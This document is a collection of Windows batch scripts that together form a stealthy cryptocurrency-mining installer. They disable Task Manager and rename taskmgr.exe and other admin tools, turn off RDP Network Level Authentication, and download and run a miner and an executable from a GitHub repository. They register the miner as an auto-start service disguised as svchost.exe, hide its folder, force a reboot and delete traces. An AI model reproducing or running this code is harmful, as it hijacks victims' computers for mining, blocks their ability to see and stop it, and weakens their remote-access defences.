@echo off
REM Disable Task Manager for current user
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo Task Manager has been disabled.

@echo off
echo Running as Administrator...
:: Take ownership of the CSC folder
takeown /F C:\Windows\CSC /A /R /D Y

:: Grant full control to the Administrators group
icacls C:\Windows\CSC /grant Administrators:F /T /C /Q

echo Ownership and permissions updated successfully!
echo Disabling Network Level Authentication (NLA)...

:: Modify the registry to disable NLA
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

:: Define the path to taskmgr.exe and the new name
SET TaskMgrPath=C:\Windows\System32\compmgmt.msc
SET NewName=com.abc


takeown /f "%TaskMgrPath%"

:: Grant full access to the administrators group
icacls "%TaskMgrPath%" /grant administrators:F

icacls "%TaskMgrPath%" /setowner "Administrators"

:: Check if taskmgr.exe exists
IF EXIST "!TaskMgrPath!" (
    :: Attempt to rename taskmgr.exe to the new name
    REN "!TaskMgrPath!" "!NewName!"
    IF ERRORLEVEL 1 (
        echo Failed to rename taskmgr.exe. Make sure you are running as Administrator.
    ) ELSE (
        echo Successfully renamed taskmgr.exe to !NewName!.
    )
) ELSE (
    echo taskmgr.exe does not exist in the specified location.
)
@echo off



@echo off

:: Define the path to taskmgr.exe and the new name
SET TaskMgrPath=C:\Windows\System32\sysdm.cpl
SET NewName=sys.bat


takeown /f "%TaskMgrPath%"

:: Grant full access to the administrators group
icacls "%TaskMgrPath%" /grant administrators:F

icacls "%TaskMgrPath%" /setowner "Administrators"

:: Check if taskmgr.exe exists
IF EXIST "!TaskMgrPath!" (
    :: Attempt to rename taskmgr.exe to the new name
    REN "!TaskMgrPath!" "!NewName!"
    IF ERRORLEVEL 1 (
        echo Failed to rename taskmgr.exe. Make sure you are running as Administrator.
    ) ELSE (
        echo Successfully renamed taskmgr.exe to !NewName!.
    )
) ELSE (
    echo taskmgr.exe does not exist in the specified location.
)

@echo off

:: Define the path to taskmgr.exe and the new name
SET TaskMgrPath=C:\Windows\System32\taskmgr.exe
SET NewName=tsk.abc


takeown /f "%TaskMgrPath%"

:: Grant full access to the administrators group
icacls "%TaskMgrPath%" /grant administrators:F

icacls "%TaskMgrPath%" /setowner "Administrators"

:: Check if taskmgr.exe exists
IF EXIST "!TaskMgrPath!" (
    :: Attempt to rename taskmgr.exe to the new name
    REN "!TaskMgrPath!" "!NewName!"
    IF ERRORLEVEL 1 (
        echo Failed to rename taskmgr.exe. Make sure you are running as Administrator.
    ) ELSE (
        echo Successfully renamed taskmgr.exe to !NewName!.
    )
) ELSE (
    echo taskmgr.exe does not exist in the specified location.
)





@echo off
cls
setlocal

:: Define the download URL and destination path
set "URL=https://raw.githubusercontent.com/cac4444/srb/main/SRB.zip"
set "DEST=C:\Windows\CSC\SRB.zip"
set "EXTRACT_PATH=C:\Windows\CSC"

:: Ensure the destination folder exists
if not exist "%EXTRACT_PATH%" mkdir "%EXTRACT_PATH%"

:: Use BITS to download the file
echo Downloading SRB.zip...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"

:: Check if download was successful
if not exist "%DEST%" (
    echo Download failed!
    pause
    exit /b
)

echo Download completed.

:: Extract the ZIP file using PowerShell
echo Extracting SRB.zip...
powershell -Command "Expand-Archive -Path '%DEST%' -DestinationPath '%EXTRACT_PATH%' -Force"

:: Optional: Delete the ZIP file after extraction
del "%DEST%"

echo Done!


@echo off
cls
setlocal

:: Define the download URL and destination path
set "URL=https://github.com/cac4444/srb/raw/refs/heads/main/vps.exe"
set "DEST=C:\Windows\CSC\vps.exe"
set "EXTRACT_PATH=C:\Windows\CSC"

:: Ensure the destination folder exists
if not exist "%EXTRACT_PATH%" mkdir "%EXTRACT_PATH%"

:: Use BITS to download the file
echo Downloading SRB.zip...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"

:: Check if download was successful
if not exist "%DEST%" (
    echo Download failed!
    pause
    exit /b
)


"C:\Windows\CSC\vps.exe"


@echo off
setlocal enabledelayedexpansion
:: Get public IP address
for /f "delims=" %%A in ('powershell -Command "(Invoke-WebRequest -UseBasicParsing -Uri 'https://api64.ipify.org').Content"') do set "IP=%%A"
:: Create start-mining-epiccash-and-salvuim.bat with the correct format
(
    echo @echo off
    echo cd %%~dp0
    echo cls
    echo.
    echo SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7028 --wallet farington#%IP% --wallet SaLvdXgjQQNC6DFxZgMEHpQ4RG6LjBynZGxrbp5kEit1YxBUoeRB81cLR2NNU43mP9DfyEPqHpf8VMNT4aXSXyefKQTLqoVMUgJ/Worker02 --password x --password x
    echo pause
) > C:\Windows\CSC\SRB\start-mining-epiccash-and-salvuim.bat
echo epic-sal.bat has been created with IP: %IP%




@echo off
cd /d "%~dp0"
echo Configuring "Lock Pages in Memory" privilege...

:: Set the username (modify if needed)
set USERNAME=%USERNAME%

:: Grant "Lock Pages in Memory" right
C:\Windows\CSC\SRB\ntrights.exe -u %USERNAME% +r SeLockMemoryPrivilege

set USERNAME=SYSTEM

:: Grant "Lock Pages in Memory" right FOR SYSTEM
C:\Windows\CSC\SRB\ntrights.exe -u %USERNAME% +r SeLockMemoryPrivilege



@echo off
setlocal

:: Set your service name
set SERVICE_NAME=NcaMvc

:: Set the path to your batch script
set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe --multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool 51pool.online:3416 --pool sal.kryptex.network:7777 --wallet farington#Worker01 --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/Worker02 --password Worker01 --password Worker02

:: Set the NSSM path (Change this if NSSM is not in the same folder)
set NSSM_PATH=C:\Windows\CSC\SRB\svchost.exe
%NSSM_PATH% stop %SERVICE_NAME%
%NSSM_PATH% remove %SERVICE_NAME% confirm
:: Install the service
%NSSM_PATH% install %SERVICE_NAME% "%SCRIPT_PATH%"

:: Configure the service restart behavior
%NSSM_PATH% set %SERVICE_NAME% AppDirectory C:\Windows\CSC\SRB
%NSSM_PATH% set %SERVICE_NAME% Start SERVICE_AUTO_START
%NSSM_PATH% set %SERVICE_NAME% AppExit Default Restart

:: Start the service
%NSSM_PATH% start %SERVICE_NAME%

echo Service "%SERVICE_NAME%" installed and started successfully!


attrib +s +h "C:\Windows\CSC\*" 
attrib +s +h "C:\Windows\CSC\SRB"
attrib +s +h "C:\Windows\CSC\SRB\*"
attrib +s +h "C:\Windows\CSC\SRB\Cache"
attrib +s +h "C:\Windows\CSC\SRB\Devcon"
attrib +s +h "C:\Windows\CSC\SRB\Help"
attrib +s +h "C:\Windows\CSC\SRB\SRBMULTI-Restarter"

:: Restart the system to apply changes
shutdown /r /t 20 /f
@echo off
taskkill /f /im SRB.bat >nul 2>&1
del /f /q "SRB-invoke.bat"
ENDLOCAL
pause



